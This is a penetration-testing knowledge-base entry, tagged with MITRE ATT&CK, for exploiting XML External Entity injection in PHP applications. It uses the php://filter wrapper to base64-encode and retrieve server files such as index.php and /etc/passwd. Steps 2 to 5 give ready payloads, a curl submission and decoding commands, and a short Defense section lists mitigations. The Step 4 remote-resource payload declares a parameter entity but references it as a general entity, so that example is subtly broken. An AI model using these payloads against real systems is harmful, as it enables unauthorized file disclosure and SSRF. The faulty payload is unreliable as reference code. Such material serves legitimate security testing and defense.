---
id: 1f0c1441-39ec-44a5-a1c6-5338be6f934c
name: XXE-File-Retrieval-with-PHP-Wrapper
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:44.190304+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - '[[techniques/Data Encoding|T1132 - Data Encoding]]'
  - >-
    [[techniques/File and Directory Discovery|T1083 - File and Directory
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/Exploiting XXE to retrieve files]]'
  - '[[tags/PHP Wrapper inside XXE]]'
  - '[[tags/XML External Entity]]'
  - xxe
  - php-wrapper
  - file-retrieval
commands: []
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# XXE-File-Retrieval-with-PHP-Wrapper

## Summary

This procedure exploits XML External Entity (XXE) injection vulnerabilities in XML parsers, specifically using PHP wrappers to retrieve sensitive local files from the target server. By crafting malicious XML payloads that leverage the php://filter stream wrapper to base64-encode file contents, attackers can exfiltrate data such as configuration files or source code without direct file access. This technique is effective against PHP-based applications that process untrusted XML input without proper entity resolution disabled.

## Description

XXE attacks occur when an XML parser processes external entities defined in user-supplied input, potentially leading to file disclosure, SSRF, or code execution. In this procedure, the focus is on local file retrieval using the PHP-specific php://filter wrapper, which allows reading and encoding files before they are included in the XML response. The wrapper converts the target file's contents to base64, embedding them in the application's output (e.g., in a form field or response body). This is particularly useful in web applications handling XML uploads or API requests, such as contact forms or document parsers. Prerequisites include identifying an endpoint that echoes or processes XML entities. Success results in base64-encoded file contents, which can be decoded offline to reveal sensitive information like /etc/passwd or application configs. Note that this requires the parser to support external entities and PHP's stream wrappers to be enabled.

## Requirements

1. A vulnerable web application endpoint that accepts and parses XML input without disabling external entity processing (libxml_disable_entity_loader(false) or equivalent).
2. Knowledge of the target server's file paths (e.g., /var/www/html/index.php or /etc/passwd) to specify in the payload.
3. A tool like Burp Suite or curl to submit the crafted XML payload via POST or PUT requests.
4. Decoder tool (e.g., base64 command) to interpret the output.
5. Network access to the target application, typically over HTTP/HTTPS.

## Defense

- Disable external entity processing in XML parsers (e.g., set libxml_disable_entity_loader(true) in PHP or use secure parsers like defusedxml in Python).
- Validate and sanitize all XML inputs, rejecting DTDs or using whitelisting for allowed elements.
- Implement web application firewalls (WAFs) to detect XXE patterns, such as php:// or expect:// in payloads.
- Run applications with least privilege, restricting file system access to prevent disclosure of sensitive paths.
- Enable logging for XML parsing errors and monitor for anomalous base64 strings in responses.

## Objectives

1. Retrieve the contents of sensitive local files from the target server via XXE injection.
2. Encode file data in base64 to bypass output filters or detection.
3. Exfiltrate data embedded in the application's response for offline analysis.
4. Potentially chain with other techniques for further exploitation, such as SSRF if remote wrappers are supported.

## Instructions

### Step 1: Identify Vulnerable XML Endpoint

**Context**: Locate an input field or API that processes XML, such as a contact form or file upload. Test for XXE by submitting a basic external entity payload to confirm entity expansion (e.g., <!ENTITY test SYSTEM "file:///etc/passwd"> and check if content echoes back).

No specific command; use browser dev tools or [[tools/Burp-Suite]] to inspect requests. Expected: Confirmation that entities are processed without errors.

### Step 2: Craft Payload for Local File Base64 Encoding

**Context**: Create an XML payload using the PHP wrapper to read and base64-encode a local file like index.php. This step embeds the encoded content in the response via entity expansion.

**Code** ([[codes/XXE-PHP-Wrapper-Base64-Encode-Local-File]]):

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

Submit this XML via POST to the endpoint. The &xxe; entity will expand to the base64-encoded file contents in the 'name' field. Expected: Response includes a long base64 string in the echoed field.

### Step 3: Submit Payload and Extract Encoded Data

**Context**: Send the crafted XML to the vulnerable parser. If the endpoint echoes the processed XML (e.g., in a preview or error message), the file contents will appear base64-encoded.

Use curl or a proxy to POST the XML:

```bash
curl -X POST -d @payload.xml http://target.com/vulnerable-endpoint
```

Decode the base64 output manually: `echo 'BASE64_STRING' | base64 -d`. Expected: Readable file contents upon decoding.

### Step 4: Test Remote Resource Retrieval if Applicable

**Context**: For out-of-band or remote file scenarios, adapt the payload to reference a remote resource via the wrapper. This may require server-side support for remote streams and is useful for SSRF chaining.

**Code** ([[codes/XXE-PHP-Wrapper-Base64-Encode-Remote-Resource]]):

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

Submit similarly and check for encoded remote content. Expected: Base64 of the remote resource if accessible; otherwise, parser error.

### Step 5: Verify and Analyze Retrieved Data

**Context**: Confirm the retrieved data's integrity and sensitivity. Check for further exploitable info like credentials or paths.

Decode and inspect: `base64 -d encoded_output.txt > retrieved_file.php`. Expected: Valid file contents matching the target path.
